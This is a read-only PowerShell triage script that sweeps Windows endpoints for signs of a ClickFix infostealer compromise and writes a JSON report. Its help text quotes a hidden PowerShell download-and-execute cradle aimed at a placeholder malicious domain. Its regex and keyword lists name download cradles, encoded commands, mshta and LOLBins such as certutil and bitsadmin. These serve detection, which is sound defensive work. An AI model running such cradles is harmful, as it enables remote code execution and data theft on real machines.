<#
.SYNOPSIS
    ClickFix / infostealer compromise triage sweep for Windows endpoints.

.DESCRIPTION
    Read-only detection script for the ClickFix social-engineering technique
    (malicious command pasted into Win+R / Windows Terminal, e.g.
    powershell -w h "iex(irm '<malicious-domain>/<id>')").

    Checks, per endpoint:
      1.  RunMRU registry (Win+R history) for all loaded user hives
      2.  PSReadLine console history for all user profiles (covers Win+X -> Terminal variant)
      3.  PowerShell Operational log (4104 script block) for IEX/IRM download cradles
      4.  Security log 4688 process creation (if command-line auditing enabled)
      5.  Sysmon Operational log (events 1, 3, 22) if Sysmon is installed
      6.  DNS client cache + hosts file for the IOC domain
      7.  Persistence: Run/RunOnce keys, scheduled tasks, startup folders, WMI subscriptions
      8.  Recently created executables in TEMP / APPDATA / LOCALAPPDATA (all profiles)
      9.  Prefetch evidence of powershell/mshta/wscript execution
      10. Current established TCP connections with owning process
      11. Microsoft Defender detection history

    Makes NO changes to the endpoint. Safe to run repeatedly. Designed for
    fleet deployment (Intune/GPO/ConfigMgr) - emits JSON and a deterministic
    exit code for central collection.

.PARAMETER IocDomain
    Malicious domain(s) to hunt for. Defaults to the known campaign domain.

.PARAMETER IocPattern
    Additional regex fragments treated as high-confidence IOCs (e.g. the
    ClickFix "check code"). Matched against history/logs/registry values.

.PARAMETER DaysBack
    Look-back window for event logs and file creation. Default 14.

.PARAMETER OutputPath
    Path for the JSON report. Default: .\ClickFixTriage_<COMPUTERNAME>_<yyyyMMdd-HHmmss>.json

.OUTPUTS
    Exit 0 = no findings. Exit 1 = one or more findings (inspect JSON).
    Exit 2 = script execution error.

.EXAMPLE
    .\Invoke-ClickFixTriage.ps1 -Verbose

.EXAMPLE
    # Fleet sweep with central UNC collection
    .\Invoke-ClickFixTriage.ps1 -OutputPath "\\fileserver\ir-sweep\$env:COMPUTERNAME.json"

.NOTES
    Run elevated for full coverage (event logs, other users' profiles, prefetch).
    Degrades gracefully without elevation but flags reduced coverage in the report.
    Windows PowerShell 5.1 compatible.
#>
[CmdletBinding()]
param(
    [string[]]$IocDomain = @('auth-id-browser.info'),
    [string[]]$IocPattern = @('238afe5dfe3007db'),
    [ValidateRange(1, 365)]
    [int]$DaysBack = 14,
    [string]$OutputPath = ".\ClickFixTriage_$($env:COMPUTERNAME)_$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
$script:Findings = New-Object System.Collections.Generic.List[object]
$script:Errors   = New-Object System.Collections.Generic.List[string]
$Since           = (Get-Date).AddDays(-$DaysBack)
$IsElevated      = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
                   ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Generic ClickFix / download-cradle patterns (case-insensitive regex)
$CradlePatterns = @(
    'iex\s*\(\s*(irm|iwr|invoke-restmethod|invoke-webrequest)',
    '(irm|iwr|invoke-restmethod|invoke-webrequest)[^|]{0,120}\|\s*iex',
    '-w(indowstyle)?\s+h(idden)?\b',
    '-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{40,}',
    'mshta\s+https?:',
    '#\s*Check\s*Code',
    'not\s+a\s+robot|verification\s+(id|code)'
)
$DomainRegex  = ($IocDomain  | ForEach-Object { [regex]::Escape($_) }) -join '|'
$CustomRegex  = if ($IocPattern) { ($IocPattern | ForEach-Object { [regex]::Escape($_) }) -join '|' } else { $null }
$CradleRegex  = $CradlePatterns -join '|'

function Add-Finding {
    param(
        [Parameter(Mandatory)][ValidateSet('Critical', 'High', 'Medium', 'Low', 'Info')][string]$Severity,
        [Parameter(Mandatory)][string]$Category,
        [Parameter(Mandatory)][string]$Detail,
        [string]$Evidence = ''
    )
    $f = [pscustomobject]@{
        Timestamp = (Get-Date).ToString('o')
        Severity  = $Severity
        Category  = $Category
        Detail    = $Detail
        Evidence  = $Evidence
    }
    $script:Findings.Add($f)
    $colour = switch ($Severity) {
        'Critical' { 'Red' } 'High' { 'Red' } 'Medium' { 'Yellow' } default { 'Gray' }
    }
    Write-Host ("[{0,-8}] {1,-22} {2}" -f $Severity, $Category, $Detail) -ForegroundColor $colour
}

function Test-IocMatch {
    <# Returns 'Domain' | 'Custom' | 'Cradle' | $null for a given string. #>
    param([string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return $null }
    if ($Text -match $DomainRegex) { return 'Domain' }
    if ($CustomRegex -and $Text -match $CustomRegex) { return 'Custom' }
    if ($Text -match $CradleRegex) { return 'Cradle' }
    return $null
}

function Get-SeverityForMatch {
    param([string]$MatchType)
    switch ($MatchType) {
        'Domain' { 'Critical' }
        'Custom' { 'Critical' }
        'Cradle' { 'High' }
        default  { 'Medium' }
    }
}

Write-Host "=== ClickFix Triage Sweep | $env:COMPUTERNAME | $(Get-Date -Format u) ===" -ForegroundColor Cyan
Write-Host "IOC domains : $($IocDomain -join ', ')"
Write-Host "IOC patterns: $($IocPattern -join ', ')"
Write-Host "Look-back   : $DaysBack days | Elevated: $IsElevated`n"
if (-not $IsElevated) {
    Add-Finding -Severity Info -Category 'Coverage' -Detail 'Not running elevated - event log, prefetch and cross-profile coverage is reduced. Re-run as Administrator.'
}

# ---------------------------------------------------------------------------
# 1. RunMRU (Win+R history) - all loaded user hives
# ---------------------------------------------------------------------------
Write-Verbose 'Checking RunMRU registry across loaded user hives...'
try {
    if (-not (Get-PSDrive -Name HKU -ErrorAction SilentlyContinue)) {
        $null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -Scope Script
    }
    $hives = Get-ChildItem HKU:\ -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }
    foreach ($hive in $hives) {
        $mruPath = "HKU:\$($hive.PSChildName)\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        if (-not (Test-Path $mruPath)) { continue }
        $mru = Get-ItemProperty -Path $mruPath -ErrorAction SilentlyContinue
        if (-not $mru) { continue }
        foreach ($prop in $mru.PSObject.Properties) {
            if ($prop.Name -in @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider', 'MRUList')) { continue }
            $value = [string]$prop.Value
            # ANY interpreter/LOLBin in the Run dialog is abnormal for a standard user
            if ($value -match 'powershell|pwsh|mshta|cmd(\.exe)?\s|curl|wget|rundll32|wscript|cscript|bitsadmin|certutil') {
                $match = Test-IocMatch -Text $value
                $sev = if ($match -in @('Domain', 'Custom')) { 'Critical' } elseif ($match -eq 'Cradle') { 'Critical' } else { 'High' }
                Add-Finding -Severity $sev -Category 'RunMRU' `
                    -Detail "Interpreter/LOLBin command in Win+R history (SID $($hive.PSChildName))" `
                    -Evidence $value
            }
        }
    }
} catch { $script:Errors.Add("RunMRU: $_") }

# ---------------------------------------------------------------------------
# 2. PSReadLine console history - all user profiles
# ---------------------------------------------------------------------------
Write-Verbose 'Checking PSReadLine console history...'
try {
    $historyFiles = Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -ErrorAction SilentlyContinue
    foreach ($file in $historyFiles) {
        $userName = ($file.FullName -split '\\')[2]
        $lineNo = 0
        foreach ($line in [System.IO.File]::ReadLines($file.FullName)) {
            $lineNo++
            $match = Test-IocMatch -Text $line
            if ($match) {
                Add-Finding -Severity (Get-SeverityForMatch $match) -Category 'PSHistory' `
                    -Detail "Suspicious command in $userName's PowerShell history (line $lineNo, match: $match)" `
                    -Evidence $line.Trim()
            }
        }
    }
} catch { $script:Errors.Add("PSHistory: $_") }

# ---------------------------------------------------------------------------
# 3. PowerShell Operational log - 4104 script block logging
# ---------------------------------------------------------------------------
Write-Verbose 'Checking PowerShell 4104 script block events...'
try {
    $events = Get-WinEvent -FilterHashtable @{
        LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104; StartTime = $Since
    } -ErrorAction SilentlyContinue
    foreach ($evt in $events) {
        $match = Test-IocMatch -Text $evt.Message
        if ($match) {
            $snippet = ($evt.Message -split "`n" | Where-Object { Test-IocMatch $_ } | Select-Object -First 1)
            Add-Finding -Severity (Get-SeverityForMatch $match) -Category 'EventLog-4104' `
                -Detail "Script block match ($match) at $($evt.TimeCreated.ToString('u'))" `
                -Evidence ([string]$snippet).Trim()
        }
    }
    if ($null -eq $events) {
        Add-Finding -Severity Info -Category 'EventLog-4104' `
            -Detail 'No 4104 events found - Script Block Logging is likely DISABLED. Enable it via the hardening script; historical visibility is limited.'
    }
} catch { $script:Errors.Add("4104: $_") }

# ---------------------------------------------------------------------------
# 4. Security log 4688 - process creation with command line
# ---------------------------------------------------------------------------
Write-Verbose 'Checking Security 4688 process creation events...'
try {
    $events = Get-WinEvent -FilterHashtable @{
        LogName = 'Security'; Id = 4688; StartTime = $Since
    } -ErrorAction SilentlyContinue
    foreach ($evt in $events) {
        $match = Test-IocMatch -Text $evt.Message
        if ($match) {
            Add-Finding -Severity (Get-SeverityForMatch $match) -Category 'EventLog-4688' `
                -Detail "Process creation match ($match) at $($evt.TimeCreated.ToString('u'))" `
                -Evidence (($evt.Message -split "`n" | Select-String 'Process Command Line' | Select-Object -First 1).ToString().Trim())
        }
    }
} catch { $script:Errors.Add("4688: $_") }

# ---------------------------------------------------------------------------
# 5. Sysmon (if present) - process create (1), network (3), DNS query (22)
# ---------------------------------------------------------------------------
Write-Verbose 'Checking Sysmon operational log...'
try {
    $sysmonLog = Get-WinEvent -ListLog 'Microsoft-Windows-Sysmon/Operational' -ErrorAction SilentlyContinue
    if ($sysmonLog) {
        $events = Get-WinEvent -FilterHashtable @{
            LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1, 3, 22; StartTime = $Since
        } -ErrorAction SilentlyContinue
        foreach ($evt in $events) {
            $match = Test-IocMatch -Text $evt.Message
            if ($match) {
                Add-Finding -Severity (Get-SeverityForMatch $match) -Category "Sysmon-$($evt.Id)" `
                    -Detail "Sysmon event $($evt.Id) match ($match) at $($evt.TimeCreated.ToString('u'))" `
                    -Evidence (($evt.Message -split "`n")[0..3] -join ' | ')
            }
        }
    }
} catch { $script:Errors.Add("Sysmon: $_") }

# ---------------------------------------------------------------------------
# 6. DNS cache + hosts file
# ---------------------------------------------------------------------------
Write-Verbose 'Checking DNS client cache and hosts file...'
try {
    $dns = Get-DnsClientCache -ErrorAction SilentlyContinue | Where-Object { $_.Entry -match $DomainRegex }
    foreach ($entry in $dns) {
        Add-Finding -Severity Critical -Category 'DNSCache' `
            -Detail 'IOC domain present in DNS client cache - endpoint resolved the malicious domain recently' `
            -Evidence "$($entry.Entry) -> $($entry.Data)"
    }
    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    $hostsHits = Select-String -Path $hostsPath -Pattern $DomainRegex -ErrorAction SilentlyContinue
    foreach ($hit in $hostsHits) {
        # Distinguish sinkhole (0.0.0.0 / 127.0.0.1) from anything else
        if ($hit.Line -match '^\s*(0\.0\.0\.0|127\.0\.0\.1)') {
            Add-Finding -Severity Info -Category 'HostsFile' -Detail 'IOC domain is sinkholed in hosts file (expected if hardening applied)' -Evidence $hit.Line.Trim()
        } else {
            Add-Finding -Severity High -Category 'HostsFile' -Detail 'IOC domain present in hosts file with non-sinkhole address' -Evidence $hit.Line.Trim()
        }
    }
} catch { $script:Errors.Add("DNS: $_") }

# ---------------------------------------------------------------------------
# 7. Persistence: Run/RunOnce, scheduled tasks, startup folders, WMI
# ---------------------------------------------------------------------------
Write-Verbose 'Checking persistence locations...'
try {
    # Run / RunOnce - machine and all loaded user hives
    $runKeys = @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
    )
    $hives = Get-ChildItem HKU:\ -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }
    foreach ($hive in $hives) {
        $runKeys += "HKU:\$($hive.PSChildName)\Software\Microsoft\Windows\CurrentVersion\Run"
        $runKeys += "HKU:\$($hive.PSChildName)\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    }
    foreach ($key in $runKeys) {
        if (-not (Test-Path $key)) { continue }
        $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
        foreach ($prop in $props.PSObject.Properties) {
            if ($prop.Name -in @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')) { continue }
            $value = [string]$prop.Value
            $match = Test-IocMatch -Text $value
            $suspiciousPath = $value -match '\\(AppData|Temp|ProgramData|Users\\Public)\\.*\.(exe|dll|bat|cmd|ps1|vbs|js|scr)' -or
                              $value -match 'powershell.*(-enc|-w\s+h|iex|irm|iwr)|mshta|regsvr32.*scrobj'
            if ($match -or $suspiciousPath) {
                $sev = if ($match) { Get-SeverityForMatch $match } else { 'Medium' }
                Add-Finding -Severity $sev -Category 'Persistence-Run' `
                    -Detail "Suspicious autorun value '$($prop.Name)' in $key" -Evidence $value
            }
        }
    }

    # Scheduled tasks - suspicious actions or recently registered
    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
    foreach ($task in $tasks) {
        foreach ($action in @($task.Actions)) {
            $cmdLine = "$($action.Execute) $($action.Arguments)".Trim()
            $match = Test-IocMatch -Text $cmdLine
            $suspicious = $cmdLine -match 'powershell.*(-enc|-w\s+h(idden)?|iex|irm|iwr)|mshta\s+http|wscript.*\\(AppData|Temp)\\|\\Users\\[^\\]+\\AppData\\.*\.(exe|bat|vbs|js)'
            if ($match -or $suspicious) {
                $sev = if ($match) { Get-SeverityForMatch $match } else { 'High' }
                Add-Finding -Severity $sev -Category 'Persistence-Task' `
                    -Detail "Suspicious scheduled task '$($task.TaskPath)$($task.TaskName)' (state: $($task.State))" `
                    -Evidence $cmdLine
            }
        }
    }

    # Startup folders
    $startupPaths = @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp") +
        (Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction SilentlyContinue |
            Select-Object -ExpandProperty FullName)
    foreach ($sp in $startupPaths) {
        Get-ChildItem -Path $sp -File -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -ge $Since -and $_.Extension -match '\.(exe|bat|cmd|ps1|vbs|js|lnk|hta)$' } |
            ForEach-Object {
                Add-Finding -Severity Medium -Category 'Persistence-Startup' `
                    -Detail "Recently created startup item ($($_.CreationTime.ToString('u')))" -Evidence $_.FullName
            }
    }

    # WMI event subscriptions
    $consumers = Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer -ErrorAction SilentlyContinue
    foreach ($c in $consumers) {
        $cmdTpl = $c.PSObject.Properties['CommandLineTemplate']
        $script = $c.PSObject.Properties['ScriptText']
        $payload = "$(if ($cmdTpl) { $cmdTpl.Value }) $(if ($script) { $script.Value })"
        if ($payload.Trim()) {
            $match = Test-IocMatch -Text $payload
            $sev = if ($match) { Get-SeverityForMatch $match } else { 'Medium' }
            Add-Finding -Severity $sev -Category 'Persistence-WMI' `
                -Detail "WMI event consumer present: $($c.Name) [$($c.CimClass.CimClassName)] - verify legitimacy" `
                -Evidence $payload.Trim()
        }
    }
} catch { $script:Errors.Add("Persistence: $_") }

# ---------------------------------------------------------------------------
# 8. Recently created executables in user-writable staging directories
# ---------------------------------------------------------------------------
Write-Verbose 'Checking recently dropped executables...'
try {
    $stagingGlobs = @(
        'C:\Users\*\AppData\Local\Temp',
        'C:\Users\*\AppData\Roaming',
        'C:\Users\*\AppData\Local',
        'C:\ProgramData',
        'C:\Users\Public'
    )
    foreach ($glob in $stagingGlobs) {
        foreach ($dir in (Resolve-Path $glob -ErrorAction SilentlyContinue)) {
            Get-ChildItem -Path $dir.Path -Recurse -Depth 2 -File -Force -ErrorAction SilentlyContinue |
                Where-Object {
                    $_.CreationTime -ge $Since -and
                    $_.Extension -match '^\.(exe|dll|scr|bat|hta)$' -and
                    $_.FullName -notmatch '\\(Microsoft|Google|Mozilla|Adobe|Package Cache|Packages|Temp\\.*\\)' # trim obvious vendor noise
                } |
                ForEach-Object {
                    Add-Finding -Severity Medium -Category 'DroppedFile' `
                        -Detail "Executable created $($_.CreationTime.ToString('u')) in staging directory ($([math]::Round($_.Length/1KB)) KB)" `
                        -Evidence $_.FullName
                }
        }
    }
} catch { $script:Errors.Add("DroppedFiles: $_") }

# ---------------------------------------------------------------------------
# 9. Prefetch - evidence of interpreter execution
# ---------------------------------------------------------------------------
Write-Verbose 'Checking prefetch...'
try {
    $prefetch = Get-ChildItem "$env:SystemRoot\Prefetch\*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^(POWERSHELL|PWSH|MSHTA|WSCRIPT|CSCRIPT|CURL|CERTUTIL|BITSADMIN)' -and $_.LastWriteTime -ge $Since }
    foreach ($pf in $prefetch) {
        Add-Finding -Severity Low -Category 'Prefetch' `
            -Detail "Interpreter/LOLBin executed within window (last: $($pf.LastWriteTime.ToString('u'))) - correlate with user activity" `
            -Evidence $pf.Name
    }
} catch { $script:Errors.Add("Prefetch: $_") }

# ---------------------------------------------------------------------------
# 10. Live network connections
# ---------------------------------------------------------------------------
Write-Verbose 'Checking established TCP connections...'
try {
    $conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
        Where-Object { $_.RemoteAddress -notmatch '^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|fe80)' }
    foreach ($conn in $conns) {
        $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
        $procName = if ($proc) { $proc.ProcessName } else { "PID $($conn.OwningProcess)" }
        if ($procName -match '^(powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32)$') {
            Add-Finding -Severity High -Category 'Network' `
                -Detail "Script interpreter with live external connection" `
                -Evidence "$procName -> $($conn.RemoteAddress):$($conn.RemotePort)"
        }
    }
} catch { $script:Errors.Add("Network: $_") }

# ---------------------------------------------------------------------------
# 11. Defender detection history
# ---------------------------------------------------------------------------
Write-Verbose 'Checking Defender threat history...'
try {
    $threats = Get-MpThreatDetection -ErrorAction SilentlyContinue |
        Where-Object { $_.InitialDetectionTime -ge $Since }
    foreach ($t in $threats) {
        $threat = Get-MpThreat -ThreatID $t.ThreatID -ErrorAction SilentlyContinue
        Add-Finding -Severity High -Category 'Defender' `
            -Detail "Defender detection at $($t.InitialDetectionTime.ToString('u')): $($threat.ThreatName)" `
            -Evidence ($t.Resources -join '; ')
    }
} catch { $script:Errors.Add("Defender: $_") }

# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
$sevOrder = @{ Critical = 0; High = 1; Medium = 2; Low = 3; Info = 4 }
$sorted = $script:Findings | Sort-Object { $sevOrder[$_.Severity] }
$summary = $script:Findings | Group-Object Severity | ForEach-Object { "$($_.Name): $($_.Count)" }

$report = [pscustomobject]@{
    ComputerName = $env:COMPUTERNAME
    ScanTimeUtc  = (Get-Date).ToUniversalTime().ToString('o')
    Elevated     = $IsElevated
    DaysBack     = $DaysBack
    IocDomains   = $IocDomain
    IocPatterns  = $IocPattern
    FindingCount = $script:Findings.Count
    Findings     = $sorted
    Errors       = $script:Errors
}

try {
    $report | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputPath -Encoding utf8
    Write-Host "`nReport written: $OutputPath" -ForegroundColor Cyan
} catch {
    Write-Warning "Failed to write report to $OutputPath : $_"
    exit 2
}

Write-Host "=== Summary: $($script:Findings.Count) finding(s) [$($summary -join ' | ')] | $($script:Errors.Count) collection error(s) ===" -ForegroundColor Cyan

$actionable = @($script:Findings | Where-Object { $_.Severity -in @('Critical', 'High', 'Medium') })
if ($actionable.Count -gt 0) { exit 1 } else { exit 0 }
